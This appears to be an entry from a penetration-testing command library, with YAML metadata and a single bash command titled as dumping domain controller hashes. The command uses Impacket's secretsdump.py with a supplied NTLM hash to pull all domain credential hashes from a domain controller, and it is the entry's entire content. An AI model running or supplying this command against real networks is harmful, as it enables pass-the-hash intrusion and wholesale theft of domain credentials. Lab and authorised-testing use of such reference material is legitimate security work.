---
id: 6d1ee821-0ff3-4b27-a622-d5b2fe92f272
name: Dump domain controller hashes using secretsdump.py
type: command
executor: bash
data: ./secretsdump.py -hashes <NTLM hash> -just-dc PENTESTLAB/dc\$@<IP>
output: null
created_at: '2023-04-06T03:56:03.955026+00:00'
updated_at: '2023-04-10T20:25:54.935220+00:00'
---

# Dump domain controller hashes using secretsdump.py

```bash
./secretsdump.py -hashes <NTLM hash> -just-dc PENTESTLAB/dc\$@<IP>
```
